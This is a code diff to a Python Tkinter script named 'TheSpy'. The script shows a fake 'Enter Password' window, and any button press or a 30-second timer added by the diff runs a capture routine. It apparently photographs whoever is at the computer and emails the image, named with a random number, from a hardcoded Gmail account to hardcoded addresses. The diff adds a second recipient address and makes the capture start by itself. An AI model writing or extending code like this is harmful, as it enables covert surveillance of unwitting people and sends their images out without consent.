@@ -9,31 +9,27 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
-import threading
+import multiprocessing
 
 rnum=random.randrange(20,100,1)
 imgname="TheSpy"+str(rnum)+".png"
 
 def start_time():
-        time.sleep(3)
+        time.sleep(30)
+	capture()
+	p1.terminate()
+	p1.join()
         print(" Yess ")
-
-
-
-if __name__ == "__main__":
-    t1 = threading.Thread(target=start_time)
-    t1.start()
-
-    t1.join()
+	exit()
 
 
 def mailme(imgname):
 	fromaddr = "kattademane@gmail.com"
-	toaddr = "prathamanchan22@gmail.com"
+	toaddr = "prathamanchan22@gmail.com,prathamanchan1997@gmail.com"
 	msg = MIMEMultipart()
 	msg['From'] = fromaddr
 	msg['To'] = toaddr
-	msg['Subject'] = "He is THe Spy "+str(rnum)
+	msg['Subject'] = "THe Spy "+str(rnum)
 	body = ": )"
  
 
@@ -67,7 +63,6 @@ def goDude():
 		time.sleep(1)
 		cmd="mv "+imgname+" continue1"+str(rnum)
 		os.system(cmd)
-
 		exit()
 
 def on_closing():
@@ -86,24 +81,26 @@ def capture():
 	cmd="mv "+imgname+" close"+str(rnum)
         os.system(cmd)
         time.sleep(1)
-	exit()
 
-root=Tk()
-topframe=Frame(root)
-topframe.pack()
-bottomframe=Frame(root)
-bottomframe.pack(side=BOTTOM)
+if __name__ == "__main__":
+    p1 = multiprocessing.Process(target=start_time)
+    p1.start()
+    root=Tk()
+    topframe=Frame(root)
+    topframe.pack()
+    bottomframe=Frame(root)
+    bottomframe.pack(side=BOTTOM)
+    E1=Entry(topframe,bd=5)
 
-L1=Label(topframe,text="Enter Password")
-L1.pack(side=LEFT)
+    L1=Label(topframe,text="Enter Password")
+    continuebutton=Button(bottomframe,text="Continue",fg="black",command=goDude)
+    closebutton=Button(bottomframe,text="Close",fg="black",command=capture)
 
-E1=Entry(topframe,bd=5)
-E1.pack(side=RIGHT)
+    L1.pack(side=LEFT)
+    E1.pack(side=RIGHT)
 
-continuebutton=Button(bottomframe,text="Continue",fg="black",command=goDude)
-continuebutton.pack(side=LEFT)
-closebutton=Button(bottomframe,text="Close",fg="black",command=capture)
-closebutton.pack(side=RIGHT)
+    continuebutton.pack(side=LEFT)
+    closebutton.pack(side=RIGHT)
 
-root.protocol("WM_DELETE_WINDOW", on_closing)
-root.mainloop()
+    root.protocol("WM_DELETE_WINDOW", on_closing)
+    root.mainloop()
